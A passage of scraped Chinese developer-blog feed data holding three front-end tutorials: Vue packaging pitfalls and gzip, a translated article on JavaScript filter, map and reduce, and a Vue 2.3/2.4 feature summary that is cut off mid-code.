width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>重新打开index.html</figcaption></figure><p></p>\n<h4 id=\"-\" data-id=\"heading-10\">错误原因：</h4>\n<p></p><figure><img alt=\"dist文件夹\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/26/bfc1ccd0318c288369a1d5d914ba16b6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>dist文件夹</figcaption></figure><p></p>\n<p>打包出来所有的文件都会放在dist的static文件夹下面，index.html要加载文件，那么问题来了，'/'指的是项目的根目录 ，'./'指的是当前目录。要选哪个？当然选择原谅她了。</p>\n<h3 id=\"-history-\" data-id=\"heading-11\">第二个坑：路由history模式。</h3>\n<p>这个坑是当你使用了路由之后，<strong>在没有后端配合的情况下就手贱打开路由history模式的时候</strong>，打包出来的文件也会是一片空白的情况，很多人踩这个坑的时候花了很多时间，网上的教程基本上都是说的第一个坑，这个坑很少有人提起。</p>\n<p></p><figure><img alt=\"图片出自vue-router文档\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/9/bafef77c3943e031154d127964508072?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>图片出自vue-router文档</figcaption></figure><p></p>\n<h4 id=\"-\" data-id=\"heading-12\">打包之前的样子：</h4>\n<p>这里我弄了个示例，因为是刚创建的项目没有其他因素干扰，当你打开路由的history模式之后，开发的时候一切正常</p>\n<p></p><figure><img alt=\"打包之前的路由\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/26/28200b7f45b8aac0897f62124c41eec1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>打包之前的路由</figcaption></figure><p></p>\n<h4 id=\"-\" data-id=\"heading-13\">打包之后的样子：</h4>\n<p></p><figure><img alt=\"打包之后路径也是对的，但是页面一片空白\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/26/f9c56757612f1dd5703fbf0fa09fb155?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>打包之后路径也是对的，但是页面一片空白</figcaption></figure><p></p>\n<h4 id=\"-\" data-id=\"heading-14\">解决方式：</h4>\n<pre><code class=\"hljs bash\">// mode: <span class=\"hljs-string\">'history'</span>,//将这个模式关闭就好</code></pre><p>这里并不是说不能打开这个模式，这个模式需要后端设置的配合，详情可以看：<a href=\"https://link.juejin.im?target=https%3A%2F%2Frouter.vuejs.org%2Fzh-cn%2Fessentials%2Fhistory-mode.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">路由文档</a></p>\n<hr>\n<h3 id=\"gzip-\" data-id=\"heading-15\">Gzip 文件压缩</h3>\n<p>顺带分享一个很6的优化打包的方法，用起来也简单的很，只要下载一个插件，然后打开一个设置就好了。</p>\n<h4 id=\"-\" data-id=\"heading-16\">设置方法：</h4>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/9/1f95faabfb7463e1dce708f046960398?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>这里其实是webpack自带的一个优化打包的方法，打开这个配置后如果没有下载那个插件，会提示你下载，下载就好了。</p>\n<p>然后在打包的时候，每个js和css文件会压缩一个gz后缀的文件夹，浏览器如果支持g-zip 会自动查找有没有gz文件 找到了就加载gz然后本地解压 执行。</p>\n<p>打开这个配置会之后对整体的打包体积也就是dist文件夹并没有太大的变化。下图来看看他的压缩率以及对加载的提升，可以说是非常大且明显的，大家可以自己试一下就知道多好用了。</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/10/9/7fd308bb2a27aba49009455266da73d3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h2 id=\"-\" data-id=\"heading-17\">后话</h2>\n<p>之前自己打包的时候连着踩了不少坑，可能是互相关联的，有时候你并不是错了一个地方，要想想自己其他地方是不是也是错的。上述的内容，算是自己踩坑的一些经验，希望可以帮到大家。</p>\n<p><strong>最后</strong>：如需转载，请放上原文链接并署名。码字不易，<strong>感谢</strong>支持！本人写文章本着交流记录的心态，写的不好之处，不撕逼，但是欢迎指点。然后就是希望看完的朋友点个<strong>喜欢</strong>，也可以<strong>关注</strong>一下我。<br><strong><a href=\"https://link.juejin.im?target=https%3A%2F%2Fjuejin.im%2Fuser%2F58714f0eb123db4a2eb95372\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">掘金个人主页</a> </strong> </p>\n<p>以上2017.10.10</p>\n</div>"},null,null,null,{"title":"【译】高阶函数：利用Filter、Map和Reduce来编写更易维护的代码","avatar":"https://dn-mhke0kuv.qbox.me/AMoxjvDynhjKBS6sASqmCRB?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"JeLewine","create_time":"2017 年 09 月 27 日","tags":["JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>原文：<a href=\"https://link.juejin.im?target=http%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fmedium.freecodecamp.org%2Fhigher-order-functions-in-javascript-d9101f9cf528\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Higher Order Functions: Using Filter, Map and Reduce for More Maintainable Code</a><br>作者：Guido Schmitz</p>\n<p>高阶函数可以帮助你增强你的JavaScript，让你的代码更具有声明性。简单来说，就是简单，简练，可读。</p>\n<p>知道什么时候和怎样使用高阶函数是至关重要的。它们可以让你的代码更容易理解和具有更好的可维护性。它们也可以让你很轻松的进行函数间的组合。我们叫它复合函数，不过我不会在这里进行详细的介绍。在本文中，我将介绍JavaScript中三个最常用的高阶函数：<code>.filter()</code>，<code>.map()</code>，<code>.reduce</code>。</p>\n<h2 id=\"filter\" data-id=\"heading-0\">Filter</h2>\n<p>想象一下你正在编写一段代码：有一个写满不同人信息的列表，不过你想要过滤出一个大于等于18岁人的列表。</p>\n<p>我们的列表看起来就像下面这样：</p>\n<pre><code class=\"hljs bash\">const people = [\n { name: ‘John Doe’, age: 16 },\n { name: ‘Thomas Calls’, age: 19 },\n { name: ‘Liam Smith’, age: 20 },\n { name: ‘Jessy Pinkman’, age: 18 },\n];</code></pre><p>我们先来看看第一个高阶函数是如何筛选出大于等于18岁人的栗子。为了简洁，我将使用ES6标准中的箭头函数。这是一种非常简洁的定义函数的方式，可以让我们不必再写<code>function</code>和<code>return</code>，以及一些括号、大括号和分号。</p>\n<pre><code class=\"hljs bash\">const peopleAbove18 = (collection) =&gt; {\n  const results = [];\n\n  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> i = 0; i &lt; collection.length; i++) {\n    const person = collection[i];\n\n    <span class=\"hljs-keyword\">if</span> (person.age &gt;= 18) {\n      results.push(person);\n    }\n  }\n  <span class=\"hljs-built_in\">return</span> results;\n};</code></pre><p>那现在如果我们想要筛选出18~20岁之间的人呢？</p>\n<pre><code class=\"hljs bash\">const peopleBetween18And20 = (collection) =&gt; {\n  const results = [];\n\n  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> i = 0; i &lt; collection.length; i++) {\n    const person = collection[i];\n\n    <span class=\"hljs-keyword\">if</span> (person.age &gt;= 18 &amp;&amp; person.age &lt;= 20) {\n      results.push(person);\n    }\n  }\n  <span class=\"hljs-built_in\">return</span> results;\n};</code></pre><p>你可能已经意识到了这里有许多重复的代码。我们可以抽象出一个通用的解决方案。这两个函数有一些共同点。它们都在一个列表中进行迭代，并且在给定的条件下进行过滤。</p>\n<blockquote>\n<p>\"高阶函数是一个将一个或多个函数作为参数的函数\"——ClojureBridge</p>\n</blockquote>\n<p>我们可以通过使用更具声明性的<code>.filter()</code>方法来改进我们之前的函数。</p>\n<pre><code class=\"hljs bash\">const peopleAbove18 = (collection) =&gt; {\n  <span class=\"hljs-built_in\">return</span> collection\n    .filter((person) =&gt; person.age &gt;= 18);\n}</code></pre><p>太棒了!我们通过使用高阶函数减少了许多额外的代码。同时也让我们的代码更具可读性。我们不在乎如何过滤东西，我们只是希望它被过滤。这篇文章稍后会介绍组合函数。</p>\n<h2 id=\"map\" data-id=\"heading-1\">Map</h2>\n<p>让我们拿着刚刚的人员名单和一个其中喜欢喝咖啡的人员名单。</p>\n<pre><code class=\"hljs bash\">const coffeeLovers = [‘John Doe’, ‘Liam Smith’, ‘Jessy Pinkman’];</code></pre><p>用命令式的实现方式就像下面这样：</p>\n<pre><code class=\"hljs bash\">const addCoffeeLoverValue = (collection) =&gt; {\n  const results = [];\n\n  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> i = 0; i &lt; collection.length; i++) {\n    const person = collection[i];\n    <span class=\"hljs-keyword\">if</span> (coffeeLovers.includes(person.name)) {\n      person.coffeeLover = <span class=\"hljs-literal\">true</span>;\n    } <span class=\"hljs-keyword\">else</span> {\n      person.coffeeLover = <span class=\"hljs-literal\">false</span>;\n    }\n\n    results.push(person);\n  }\n\n  <span class=\"hljs-built_in\">return</span> results;\n};</code></pre><p>我们可以利用<code>.map()</code>来让代码更具有声明性：</p>\n<pre><code class=\"hljs bash\">const incrementAge = (collection) =&gt; {\n  <span class=\"hljs-built_in\">return</span> collection.map((person) =&gt; {\n    person.coffeeLover = coffeeLovers.includes(person.name);\n\n    <span class=\"hljs-built_in\">return</span> person;\n  });\n};</code></pre><p>再说一遍，<code>.map()</code>是一个高阶函数。它允许我们将一个函数作为参数传递。</p>\n<h2 id=\"reduce\" data-id=\"heading-2\">Reduce</h2>\n<p>我敢打赌，当你知道什么时候和怎样使用它的时候，你会喜欢上这个函数。<code>.reduce()</code>很酷，上面提到的的大部分函数都可以通过它来实现。</p>\n<p>让我们先举一个简单的栗子。我们想计算所有人年龄的和。当然了，我们还是会首先看看如何用命令式的方式实现。它基本上就是通过循环来增加总年龄变量。</p>\n<pre><code class=\"hljs bash\">const sumAge = (collection) =&gt; {\n  <span class=\"hljs-built_in\">let</span> num = 0;\n\n  collection.forEach((person) =&gt; {\n    num += person.age;\n  });\n\n  <span class=\"hljs-built_in\">return</span> num;\n}</code></pre><p>接下来是使用<code>.reduce()</code>的声明式方法：</p>\n<pre><code class=\"hljs bash\">const sumAge = (collection) =&gt; collection.reduce((sum, person) =&gt; {\n <span class=\"hljs-built_in\">return</span> sum + person.age;\n}, 0);</code></pre><p>我们甚至可以使用<code>.reduce()</code>来创建我们自己的<code>.map()</code>和<code>.filter()</code>。</p>\n<pre><code class=\"hljs bash\">const map = (collection, fn) =&gt; {\n  <span class=\"hljs-built_in\">return</span> collection.reduce((acc, item) =&gt; {\n    <span class=\"hljs-built_in\">return</span> acc.concat(fn(item));\n  }, []);\n}\nconst filter = (collection, fn) =&gt; {\n  <span class=\"hljs-built_in\">return</span> collection.reduce((acc, item) =&gt; {\n    <span class=\"hljs-keyword\">if</span> (fn(item)) {\n      <span class=\"hljs-built_in\">return</span> acc.concat(item);\n    }\n\n    <span class=\"hljs-built_in\">return</span> acc;\n  }, []);\n}</code></pre><p>一开始这一块儿可能比较难理解。不过，<code>.reduce()</code>做的基本上就是以一个集合和一个定义了初始值的变量开始。然后，遍历该集合并将值添加到变量中去。</p>\n<h2 id=\"-map-filter-reduce\" data-id=\"heading-3\">组合map，filter和reduce</h2>\n<p>太好了，这些函数我们都有了。而且很重要的一点是，他们都存在于JavaScript的数组原型上。这意味着我们可以同时使用它们。这可以让我们轻松创建各种可复用的函数，减少编写某些功能所需要的代码量。</p>\n<p>我们已经讨论过了如何利用<code>.filter()</code>来过滤出大于等于18岁的人；利用<code>.map()</code>来添加<code>coffeeLover</code>属性；通过<code>.reduce()</code>来计算所有人年龄的和。现在，我们写一点代码将这三个步骤合并起来。</p>\n<pre><code class=\"hljs bash\">const people = [\n { name: ‘John Doe’, age: 16 },\n { name: ‘Thomas Calls’, age: 19 },\n { name: ‘Liam Smith’, age: 20 },\n { name: ‘Jessy Pinkman’, age: 18 },\n];\nconst coffeeLovers = [‘John Doe’, ‘Liam Smith’, ‘Jessy Pinkman’];\nconst ageAbove18 = (person) =&gt; person.age &gt;= 18;\nconst addCoffeeLoverProperty = (person) =&gt; {\n person.coffeeLover = coffeeLovers.includes(person.name);\n\n <span class=\"hljs-built_in\">return</span> person;\n}\nconst ageReducer = (sum, person) =&gt; {\n <span class=\"hljs-built_in\">return</span> sum + person.age;\n}, 0);\nconst coffeeLoversAbove18 = people\n .filter(ageAbove18)\n .map(addCoffeeLoverProperty);\nconst totalAgeOfCoffeeLoversAbove18 = coffeeLoversAbove18\n .reduce(ageReducer);\nconst totalAge = people\n .reduce(ageReducer);</code></pre><p>如果你用命令式方法的话，你最后会写一堆重复代码。</p>\n<p>通过<code>.map()</code>，<code>.reduce()</code>和<code>.filter()</code>来创建函数的思维将会极大的提高你的代码质量。而且可以增加可读性。你根本不必在意函数内到底发生了什么，它非常容易理解。</p>\n</div>"},null,null,null,{"title":"Vue 2.3、2.4 知识点小结","avatar":"https://user-gold-cdn.xitu.io/2017/5/8/8f921da3774a31d840cff839fd4283b8?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"三毛丶","create_time":"2017 年 07 月 21 日","tags":["Vue.js","前端"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><blockquote>\n<p>原文连接 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjkchao%2Fblog%2Fissues%2F15\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">blog</a> ， 本文不涉及 SSR.</p>\n</blockquote>\n<p>2.3 参考 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue%2Freleases%2Ftag%2Fv2.3.0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github.com/vuejs/vue/r…</a><br>2.4 参考 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue%2Freleases%2Ftag%2Fv2.4.0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github.com/vuejs/vue/r…</a><br>实例 demo 地址：<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjkchao%2Fvue-demo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github.com/jkchao/vue-…</a></p>\n<hr>\n<h1 id=\"2-3\" data-id=\"heading-0\">2.3</h1>\n<ul>\n<li><p><code>style</code> 多重值；</p>\n<pre><code class=\"hljs javascript\">    &lt;div :style=<span class=\"hljs-string\">\"{ display: ['-webkit-box', '-ms-flexbox', 'flex'] }\"</span>&gt;<span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span></code></pre><p>  这会渲染数组中最后一个被浏览器支持的值。</p>\n</li>\n<li><p>新增<code>.passive</code> 修饰符 (<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjkchao%2Fvue-demo%2Fblob%2Fmaster%2Fsrc%2Fviews%2Fdemo1.vue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">demo1</a>) ； .passive 修饰符表示事件永远不会调用 preventDefault() ，主要为解决滚动和触摸事件的卡顿而出现，关于 passive 更多信息请移步 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FEventTarget%2FaddEventListener\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">MDN</a> 。</p>\n</li>\n</ul>\n<ul>\n<li><p>重新引入 <code>.sync</code> 修饰符  (<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjkchao%2Fvue-demo%2Fblob%2Fmaster%2Fsrc%2Fviews%2Fdemo2.vue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">demo2</a>)；提供对于 prop 的双向绑定。</p>\n<pre><code class=\"hljs javascript\">    &lt;child :bar.sync=<span class=\"hljs-string\">\"foo\"</span>&gt;<span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child</span>&gt;</span></span></code></pre><p>  其实是个语法糖</p>\n<pre><code class=\"hljs javascript\">    &lt;child :bar=<span class=\"hljs-string\">\"foo\"</span> @update:bar=<span class=\"hljs-string\">\"e =&gt; foo = e\"</span>&gt;</code></pre><p>  此时需要在子组件中显示触发事件：</p>\n<pre><code class=\"hljs javascript\">    <span class=\"hljs-keyword\">this</span>.$emit(<span class=\"hljs-string\">'update:bar'</span>, newValue)</code></pre></li>\n</ul>\n<ul>\n<li><p>Async Component  Improvements (<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjkchao%2Fvue-demo%2Fblob%2Fmaster%2Fsrc%2Fviews%2Fdemo3.vue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">demo3</a>);</p>\n<p>  在 2.3 之前，可以使用异步组件：</p>\n<pre><code class=\"hljs javascript\">  <span class=\"hljs-comment\">// some.vue</span>\n  <span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> {\n    <span class=\"hljs-comment\">// ...</span>\n    components: {\n      <span class=\"hljs-string\">'asyncCom'</span>: <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> <span class=\"hljs-keyword\">import</span>(<span class=\"hljs-string\">'./asyncCøm'</span>)\n    }\n  }</code></pre><p>  2.3 新增高级异步组件</p>\n<p>  官网上比较清楚：</p>\n<p> </p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://github.com/jkchao/blog/raw/master/vue/async.png\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p> 为了便于演示，使用延迟加载异步组件：</p>\n<pre><code class=\"hljs javascript\">\n  <span class=\"hljs-keyword\">import</span> loadingCom <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'../components/loadingCom.vue'</span>\n  <span class=\"hljs-keyword\">import</span> errCom <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'../components/errCom.vue'</span>\n  <span class=\"hljs-keyword\">const</span> asyncCom = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> ({\n    <span class=\"hljs-attr\">component</span>: <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {\n      setTimeout(<span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> {\n        resolve(<span class=\"hljs-keyword\">import</span>(<span class=\"hljs-string\">'../components/asyncCom.vue'</span>))\n      }, <span class=\"hljs-number\">2000</span>)\n    }),\n    <span class=\"hljs-attr\">loading</span>: loadingCom,\n    <span class=\"hljs-attr\">error</span>: errCom,\n    <span class=\"hljs-attr\">delay</span>: <span class=\"hljs-number\">200</span>,\n    <span class=\"hljs-attr\">timeout</span>: <span class=\"hljs-number\">3000</span>\n  })\n\n  <span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> {\n    <span class=\"hljs-comment\">// ...</span>\n    components: { asyncCom }\n  }</code></pre><p> 效果如下图：</p>\n<p> </p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://github.com/jkchao/blog/raw/master/vue/async1.gif\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p> 或者，你也可以点击后加载 (<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjkchao%2Fvue-demo%2Fblob%2Fmaster%2Fsrc%2Fviews%2Fdemo4.vue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">demo4</a>)：</p>\n<p> </p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://github.com/jkchao/blog/raw/master/vue/async2.gif\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p> 当然，也可以用于 <code>vue-router</code> ( 2.40+ ) <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjkchao%2Fvue-demo%2Fblob%2Fmaster%2Fsrc%2Fviews%2Fdemo5.vue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">demo5</a>。</p>\n</li>\n<li><p>Functional Component Improvements；</p>\n<p>在2.3 + 版本，函数式组件可以省略 <code>props</code> 选项，所有组件上的属性会被自动解析 成<code>props</code>，更多内容，请参考 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fcn.vuejs.org%2Fv2%2Fguide%2Frender-function.html%23%E5%87%BD%E6%95%B0%E5%8C%96%E7%BB%84%E4%BB%B6\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">cn.vuejs.org/v2/guide/re…</a> 。</p>\n</li>\n</ul>\n<h1 id=\"2-4\" data-id=\"heading-1\">2.4</h1>\n<ul>\n<li><code>v-on</code> 支持绑定一个事件／监听器键值对的对象，此时不支持任何修饰器；</li>\n</ul>\n<pre><code class=\"hljs javascript\">  &lt;button v-on=<span class=\"hljs-string\">\"{ mousedown: some, mouseup: other }\"</span>&gt;<span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span></span></code></pre><ul>\n<li>新增 <code>comments</code> 选项，当设为 <code>true</code> 时，将会保留且渲染模板中的 HTML 注释；<br>该选项暂时无法在构建工具中使用 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue%2Fissues%2F6177\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"> issues</a>。</li>\n</ul>\n<ul>\n<li><p>新增 <code>interitAttrs</code> 选项；</p>\n<p>  在版本 2.4 之前，默认情况下父作用域的不被作为<code>props</code>特性绑定的属性，将会作为普通的 HTML 属性，应用在跟元素上。</p>\n<p>  举个例子：</p>\n<pre><code class=\"hljs javascript\">  <span class=\"hljs-comment\">// parent.vue</span>\n  &lt;template&gt;\n    <span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-commpent</span> <span class=\"hljs-attr\">:foo</span>=<span class=\"hljs-string\">\"f\"</span> <span class=\"hljs-attr\">:boo</span>=<span class=\"hljs-string\">\"b\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-comment</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span></span>\n\n  &lt;script&gt;\n  <span class=\"hljs-keyword\">const</span> childComment = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> <span class=\"hljs-keyword\">import</span>(<span class=\"hljs-string\">'./childCom.vue'</span>)\n  <span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> {\n    data () {\n      <span class=\"hljs-keyword\">return</span> {\n        <span class=\"hljs-attr\">f</span>: <span class=\"hljs-string\">'Hello world!'</span>\n        b: <span class=\"hljs-string\">'Hello Vue!'</span>\n      }  \n    }\n  }\n  &lt;<span class=\"hljs-regexp\">/script&gt;</span></code></pre><pre><code class=\"hljs javascript\">  <span class=\"hljs-comment\">// childComment.vue</span>\n  &lt;template&gt;\n    <span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>{{ foo }}<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span>\n\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\">\n  <span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> {\n    <span class=\"hljs-attr\">props</span>: [<span class=\"hljs-string\">'foo'</span>]\n  }\n  </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></span></code></pre><p>  最后会被渲染为：</p>\n<pre><code class=\"hljs javascript\">  &lt;div boo=<span class=\"hljs-string\">\"Hello Vue!\"</span>&gt;Hello world!<span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span></code></pre><p>  设置 <code>interitAttrs</code> 为 <code>false</code>，之后，不会应用到跟元素上。</p>\n<pre><code class=\"hljs javascript\">  // childCom.vue\n  &lt;template&gt;\n    &lt;div&gt;{{ foo }}&lt;/div&gt;\n  &lt;/template&gt;\n\n  &lt;script&gt;\n  export default {\n    props: ['foo'],\n    inheritAttrs: false\n  }\n  &lt;/script&gt;</code></pre><p>  渲染：</p>\n<pre><code class=\"hljs javascript\">\n  &lt;div&gt;Hello world!<span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span></code></pre></li>\n<li><p>新增 <code>$attrs, $listeners</code> 选项；</p>\n<p>  多级组件嵌套需要传递数据时，通常使用的方法是通过 <code>vuex</code> 。如果仅仅是传递数据，而不做中间处理，使用 <code>vuex</code> 处理，未免有点杀鸡用牛刀，Vue 2.4 版本提供了另一种方法，使用 <code>v-bind=\"$attrs\"</code>, 将父组件中不被认为 <code>props</code>特性绑定的属性传入子组件中，通常配合 <code>interitAttrs</code> 选项一起使用，具体请看 demo 。</p>\n<pre><code class=\"hljs javascript\">  <span class=\"hljs-comment\">// demo.vue</span>\n  &lt;template&gt;\n    <span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-com</span> <span class=\"hljs-attr\">:foo</span>=<span class=\"hljs-string\">\"foo\"</span> <span class=\"hljs-attr\">:boo</span>=<span class=\"hljs-string\">\"boo\"</span> <span class=\"hljs-attr\">:coo</span>=<span class=\"hljs-string\">\"coo\"</span> <span class=\"hljs-attr\">:doo</span>=<span class=\"hljs-string\">\"doo\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-com</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">tempalte</span>&gt;</span></span>\n  &lt;script&gt;\n  <span class=\"hljs-keyword\">const</span> childCom = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> <span class=\"hljs-keyword\">import</span>(<span class=\"hljs-string\">'./childCom1.vue'</span>)\n  <span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> {\n    data () {\n      <span class=\"hljs-keyword\">return</span> {\n        <span class=\"hljs-attr\">foo</span>: <span class=\"hljs-string\">'Hello World!'</span>,\n        <span class=\"hljs-attr\">boo</span>: <span class=\"hljs-string\">'Hello Javascript!'</span>,\n        <span class=\"hljs-attr\">coo</span>: <span class=\"hljs-string\">'Hello Vue'</span>,\n        <span class=\"hljs-attr\">doo</span>: <span class=\"hljs-string\">'Last'</span>\n      }\n    },\n    <span class=\"hljs-attr\">components</span>: { childCom }\n  }\n  &lt;<span class=\"hljs-regexp\">/script&gt;</span></code></pre><pre><code class=\"hljs javascript\">  <span class=\"hljs-comment\">// childCom1.vue</span>\n  &lt;template&gt;\n    <span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>\n      <span 